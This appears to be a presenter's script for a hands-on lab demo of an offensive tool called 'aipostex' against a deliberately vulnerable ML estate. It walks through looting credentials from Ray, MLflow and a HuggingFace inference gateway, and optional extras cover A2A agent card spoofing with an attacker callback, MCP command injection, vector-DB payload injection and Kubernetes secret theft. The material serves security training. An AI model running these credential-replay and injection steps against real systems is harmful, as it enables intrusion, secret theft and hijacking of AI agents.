---
title: Tactic — the guided credential chain
---

# Tactic: the guided credential chain

The guided chain end to end — one command ladder, per-hop expected output, and the credential
hand-off narration that makes it land. It runs about 20 minutes start to finish. This is the
narration script the presenter follows from the stage; attendees run the same ladder self-paced at
the tactic table across the two 50-minute waves. For the attendee self-serve card see
[Start Here](../start.md).

**Premise (one line to the room):** *"One unauthenticated Ray dashboard on ACME's ML-platform box,
chained across three teams — data science, then the app team — to real model inference. The same
estate holds the fraud model, customer PII, and a Snowflake credential."*

**Setup:** on the attack box, confirm `aipostex version`, then **open an engagement**:

```bash
aipostex sessions start acme-mlops
```

Every command from here auto-accumulates into `~/engagements/acme-mlops` — no per-command flags,
nothing to repeat. At the close you read the chain straight out of that dossier and `sessions stop`.
Pre-run `bash ~/lab/verify-chain.sh` (expect 13/13) so you know the chain is live before you talk.

---

## The ladder (attendee-paced, ~20 min end to end)

| Hop | What the room sees |
|-----|--------------------|
| Framing | The estate, the premise, the credential chain |
| Ray | Unauth dashboard, a job's `runtime_env` leaks the MLflow gateway credential |
| MLflow gateway | The looted Basic credential opens the gated gateway, a run param leaks an HF token |
| TGI gateway | The looted HF token replays into **real inference** on a model-serving endpoint |
| Dossier | `report view --chains` reconstructs the chain; the dossier hands you the loot as files |

---

## Hop 1 — Ray (unauthenticated)

```bash
aipostex ray --target http://172.16.50.20:8265 jobs
```

**Say:** "No auth at all. Ray runs jobs, and a job's runtime environment carries the env vars the
team used — including the MLflow tracking credential."

**Point at:** the `MLFLOW_TRACKING_URI` + `MLFLOW_TRACKING_USERNAME/PASSWORD` in a job's
`runtime_env`. **That Basic credential is hop 2's key** (`ray-pipeline:…`).

**Recovery:** if `jobs` shows nothing, the seed job may have aged out — re-seed Ray with
`ssh labadmin@172.16.50.20 'sudo /opt/ailab-ml/venv/bin/python3 ~/lab/ml-platform/seed_ray.py localhost 8265'`
(or `sudo bash ~/lab/ml-platform/seed.sh` to re-seed the whole ML host), then re-run.

---

## Hop 2 — MLflow auth gateway (credential-gated)

```bash
aipostex mlflow --target http://172.16.50.30:5000 \
    --header "Authorization: Basic <ray-looted-basic>" runs --limit 20
```

**Say:** "This MLflow sits behind a reverse-proxy auth gate — unauthenticated calls get 401. But
we're not unauthenticated anymore; we looted a credential from Ray. Replay it."

**Point at:** the 401-without-creds vs 200-with-the-looted-creds contrast, then the **HF token**
surfaced in a run's params/tags. **That token is hop 3's key.**

> Note for the room: `ailab-ds:5000` is the *gated* gateway (the chain hop). There's also a
> directly-exposed MLflow backend at `ailab-ml:5000` — both are realistic in an open estate; the
> gateway is here to demonstrate credential chaining, not network segmentation.

---

## Hop 3 — HF TGI gateway (real inference)

```bash
aipostex huggingface --target http://172.16.50.40:8180 \
    --header "Authorization: Bearer <mlflow-looted-hf-token>" \
    generate --prompt "incident response playbook" --force-exploit
```

**Say:** "Third team, third service. The token we pulled out of MLflow is a HuggingFace inference
token. We replay it and get **real generated text** back — actual model inference on their
model-serving backend, reached purely by chaining looted credentials."

**Point at:** `"inference": "real"` and the generated text. The tool runs a no-credential control
probe, so it only calls this a *credential replay* because the endpoint genuinely rejects the
request without the token — not just because we sent a header.

**By-hand beat (optional):** to show the operator can *keep driving* the looted service, drop into
the console and chat the model directly — same looted token, live turns:

```bash
./aipostex huggingface --target http://172.16.50.40:8180 \
    --header "Authorization: Bearer <mlflow-looted-hf-token>" shell
```

Two lines to the room: "the chain proved the credential; now we just *use* it — by hand, through
the tool." (Chat is ungated; nothing auto-chains — the operator types every turn.)

**Recovery:** if the inference backend/TGI is unavailable the tool reports `reachable`/`credential_gated` rather
than a fake success — say so plainly; the honesty is the point.

---

## Close — the engagement dossier, the whole chain

The session captured every hop into `~/engagements/acme-mlops` as you went — nothing to build or
collect. Every finding already carries the credentials it looted and its chain metadata, so you read
the chain straight out of the engagement, then close it:

```bash
# Read the attack chain from the engagement dossier: find → loot → chain → reached
aipostex report view ~/engagements/acme-mlops --chains --commands
cat ~/engagements/acme-mlops/credentials.txt   # every looted credential, grouped by service

aipostex sessions stop
```

**Say:** "We didn't just pop three boxes — the tool reconstructs the *chain*. The engagement was open
the whole demo, quietly collecting every finding; `--chains` reads it back as `find → loot → chain →
reached`: where each secret leaked, what it unlocked, and the exact command that carried us to the next
hop. The dossier is files, not a log — `credentials.txt`, `commands.sh`, raw evidence — each tagged
with how far it actually landed. That's the difference between a scanner that hands you a PDF and a
tool that hands you the keys."

**Point at:** the `[reached]` vs `[gap]` markers in the chain board, and the `landed`/`stage` tag on
each credential. Honest by construction: `reached` is a host+module correlation, not a claimed
replay — the tool won't overstate even its own board.

**Optionally, measure the coverage** (the lab's whole-estate scoreboard, not the tool's output — it
wants one JSON engagement, so merge the session's findings first):

```bash
aipostex engagement merge ~/engagements/acme-mlops/findings.jsonl -o ~/engagement.json
python3 ~/lab/scoring/score.py ~/engagement.json --strict   # coverage of the 170 planted findings
```

**The takeaway line:** *"AI infra security isn't about one service — it's about the credential
flows between them. One open Ray dashboard became real inference on two other teams' systems — and
that same chain is what reaches ACME's fraud model, customer PII, and warehouse credentials. You
secure the flows, not just the boxes."*

---

## Beyond the chain — additional surfaces (optional)

If the room wants more after the chain lands, keep the chain as the **spine** and treat these as
extras:

- **A2A — "accepted ≠ exploited"** (the real a2a-sdk agent at `172.16.50.40:8103`, *not* the scored
  `:8100` mock): `card-spoof --callback-url http://172.16.50.99:18943 --force-exploit`. Acceptance is
  only `influenced`; a real nonce-correlated out-of-band callback is what upgrades it to `takeover-capable`
  — a 30-second landed-ladder coda. **Pre-record it**; a live callback can fail on stage. The
  `--callback-url` must be routable *from the agent* — the attack-box IP here (`172.16.50.99`), or
  `host.docker.internal` for a dev-machine sandbox pre-record (a `localhost` callback stays
  `influenced`: the containerized agent can't reach your host).
- **MCP RCE · Jupyter secret-mining · vector-DB injection** — the estate's other open surfaces
  (`mcp poison --mode cmd-inject`, `jupyter ... notebooks --mine-secrets`, `vectordb ... inject
  --collection acme-knowledge-base --payload "..." --verify-persist`), the same extras the RTV tactic
  offers early finishers.
- **Operator console — interact by hand (optional):** for a "now I just *use* it" beat, the console
  drives any reachable service turn-by-turn: `aipostex jupyter … shell --force-exploit` (Python
  kernel), `aipostex mcp … shell --force-exploit` (call tools), `aipostex a2a … shell
  --force-exploit` (drive the agent), or `aipostex <llm> … shell` (chat a looted model). Manual —
  no auto-chaining. See the `request` / `shell` CLI reference.
- **K8s supply-chain (in-estate):** the cluster angle runs against the estate **k8s node**
  `ailab-k8s` (`172.16.50.50`, vuln `:6443` / secure `:6444`) — anon
  `secret-read` recovers the model-registry HF/AWS creds and `sa-loot` proves the stolen
  `pipeline-runner` SA can write the registry (supply-chain tampering). A **presenter** beat, not an
  attendee estate hop.

---

## Pre-flight checklist (run before you present)

- [ ] `bash ~/lab/verify-chain.sh` → 13/13
- [ ] `aipostex version` prints the expected build
- [ ] `aipostex sessions start acme-mlops` (fresh engagement; `sessions prune` clears old empty ones)
- [ ] Ray `jobs` returns the seeded credential-bearing job
- [ ] TGI / inference backend reachable (or be ready to narrate the honest `reachable` fallback)
